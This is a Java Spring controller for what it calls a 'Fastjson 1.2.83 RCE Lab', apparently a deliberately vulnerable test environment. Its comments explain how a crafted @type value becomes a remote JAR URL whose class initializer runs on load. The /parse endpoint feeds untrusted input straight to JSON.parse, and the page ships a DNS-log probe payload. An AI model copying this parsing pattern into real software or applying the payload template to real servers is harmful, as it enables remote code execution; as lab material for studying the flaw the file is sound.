package com.vuln.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Fastjson 1.2.83 @JSONType RCE 漏洞入口
 *
 * 漏洞原理:
 *   ParserConfig.checkAutoType() 在处理 @type 时:
 *   1. 将 typeName 中的 '.' 替换为 '/' 并追加 ".class" 作为资源路径
 *   2. 通过 ClassLoader.getResourceAsStream() 读取该资源
 *   3. 如果资源存在且字节码带 @JSONType 注解, 设置 jsonType=true
 *   4. 条件 autoTypeSupport || jsonType || expectClassFlag 为 true 时,
 *      调用 TypeUtils.loadClass() 加载类, 触发 <clinit> 执行
 *
 *   攻击者构造 @type 为 jar:http:..<INT_IP>:<PORT>.<PATH>!.POC,
 *   经过 replace('.','/') 后变成 jar:http://<INT_IP>:<PORT>/<PATH>!/POC.class,
 *   Spring Boot 的 LaunchedURLClassLoader 将其解释为远程 JAR URL 并下载,
 *   远程类的 <clinit> 在类定义阶段被执行。
 */
@Controller
public class ParseController {

    @GetMapping(value = "/", produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
    public String index() {
        String cl = String.valueOf(ParserConfig.class.getClassLoader());
        boolean autoType = ParserConfig.getGlobalInstance().isAutoTypeSupport();
        return "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Fastjson 1.2.83 RCE Lab</title></head><body>"
            + "<h2>Fastjson 1.2.83 @JSONType RCE Lab</h2>"
            + "<p><b>ClassLoader:</b> " + cl.replace("<", "&lt;") + "</p>"
            + "<p><b>autoTypeSupport:</b> " + autoType + "</p>"
            + "<p><b>safeMode:</b> false</p>"
            + "<hr><h3>Manual Test</h3>"
            + "<form id='f'>"
            + "<textarea id='payload' rows='5' cols='80'>{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.example.com\"}</textarea><br><br>"
            + "<button type='submit'>Send to /parse</button>"
            + "</form>"
            + "<pre id='result'></pre>"
            + "<script>"
            + "document.getElementById('f').onsubmit=function(e){"
            + "e.preventDefault();"
            + "fetch('/parse',{method:'POST',headers:{'Content-Type':'application/json'},body:document.getElementById('payload').value})"
            + ".then(r=>r.text()).then(t=>{document.getElementById('result').textContent=t;});"
            + "};"
            + "</script>"
            + "</body></html>";
    }

    @GetMapping(value = "/info", produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public Map<String, Object> info() {
        Map<String, Object> r = new LinkedHashMap<>();
        r.put("fastjsonVersion", "1.2.83");
        r.put("safeMode", ParserConfig.getGlobalInstance().isSafeMode());
        r.put("autoTypeSupport", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        r.put("parserConfigCL", String.valueOf(ParserConfig.class.getClassLoader()));
        return r;
    }

    @PostMapping(value = "/parse", produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public Map<String, Object> parse(@RequestBody String payload) {
        Map<String, Object> r = new LinkedHashMap<>();
        // 模拟真实场景: 使用 ParserConfig 的 ClassLoader 作为 TCCL
        // 这是 Spring Boot 等框架中常见的情况
        ClassLoader original = Thread.currentThread().getContextClassLoader();
        try {
            Thread.currentThread().setContextClassLoader(
                ParserConfig.class.getClassLoader());
            Object obj = JSON.parse(payload);
            r.put("ok", true);
            r.put("class", obj == null ? "null" : obj.getClass().getName());
            r.put("result", String.valueOf(obj));
        } catch (Throwable e) {
            r.put("ok", false);
            r.put("error", e.getClass().getName() + ": " + e.getMessage());
        } finally {
            Thread.currentThread().setContextClassLoader(original);
        }
        return r;
    }
}